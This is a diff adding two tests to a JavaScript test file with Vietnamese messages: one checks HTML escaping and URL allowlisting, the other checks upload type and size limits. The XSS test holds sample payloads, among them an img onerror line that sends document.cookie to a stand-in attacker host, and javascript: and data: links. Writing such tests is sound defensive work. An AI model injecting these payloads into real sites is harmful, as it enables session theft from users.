@@ -463,4 +463,63 @@ assert.strictEqual(stateAfterLogoutF5.currentUser, null, "Sau đăng xuất thì
 
 console.log("✅ 14. Kiểm thử duy trì phiên làm việc & tab đang xem khi nhấn F5: ĐẠT");
 
-console.log("\n🎉 TẤT CẢ CÁC BÀI KIỂM THỬ ĐÃ VƯỢT QUA THÀNH CÔNG (14/14)!");
+// 15. Test: XSS Sanitization & Malicious URL Blocking
+function sanitizeText(str) {
+  if (str === null || str === undefined) return "";
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+function sanitizeUrl(url) {
+  if (!url) return "#";
+  const trimmed = String(url).trim();
+  if (/^https?:\/\//i.test(trimmed)) {
+    return sanitizeText(trimmed);
+  }
+  return "#";
+}
+
+const xssPayload1 = "<script>alert('Hacked')</script>";
+const xssPayload2 = "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>";
+const safeText1 = sanitizeText(xssPayload1);
+const safeText2 = sanitizeText(xssPayload2);
+assert.strictEqual(safeText1.includes("<script>"), false, "Thẻ script phải bị mã hóa HTML");
+assert.strictEqual(safeText1.includes("&lt;script&gt;"), true, "Thẻ script chuyển thành entity an toàn");
+assert.strictEqual(safeText2.includes("<img"), false, "Thẻ img tấn công onerror phải bị vô hiệu hóa");
+
+const maliciousLink1 = "javascript:alert(document.domain)";
+const maliciousLink2 = "data:text/html,<script>alert(1)</script>";
+const legitimateLink = "https://drive.google.com/file/d/123/view";
+assert.strictEqual(sanitizeUrl(maliciousLink1), "#", "Link javascript: độc hại phải bị chặn về #");
+assert.strictEqual(sanitizeUrl(maliciousLink2), "#", "Link data: độc hại phải bị chặn về #");
+assert.strictEqual(sanitizeUrl(legitimateLink), legitimateLink, "Link https:// hợp lệ được phép giữ nguyên");
+console.log("✅ 15. Kiểm thử phòng chống tấn công XSS và chặn link độc hại: ĐẠT");
+
+// 16. Test: Photo Upload Constraints (MIME Type & Size Limits)
+function validateUploadFile(file) {
+  const maxBytes = 15 * 1024 * 1024; // 15MB
+  if (!file.type.startsWith("image/")) {
+    return { valid: false, reason: "NOT_IMAGE" };
+  }
+  if (file.size > maxBytes) {
+    return { valid: false, reason: "FILE_TOO_LARGE" };
+  }
+  return { valid: true };
+}
+
+const testImgOk = { name: "bai_lam.jpg", type: "image/jpeg", size: 1.5 * 1024 * 1024 };
+const testImgLarge = { name: "bai_lam_khung.jpg", type: "image/jpeg", size: 20 * 1024 * 1024 };
+const testExe = { name: "hack.exe", type: "application/x-msdownload", size: 1024 };
+
+assert.strictEqual(validateUploadFile(testImgOk).valid, true);
+assert.strictEqual(validateUploadFile(testImgLarge).valid, false);
+assert.strictEqual(validateUploadFile(testImgLarge).reason, "FILE_TOO_LARGE");
+assert.strictEqual(validateUploadFile(testExe).valid, false);
+assert.strictEqual(validateUploadFile(testExe).reason, "NOT_IMAGE");
+console.log("✅ 16. Kiểm thử ràng buộc bảo mật tệp đính kèm (MIME và dung lượng tối đa): ĐẠT");
+
+console.log("\n🎉 TẤT CẢ CÁC BÀI KIỂM THỬ ĐÃ VƯỢT QUA THÀNH CÔNG (16/16)!");
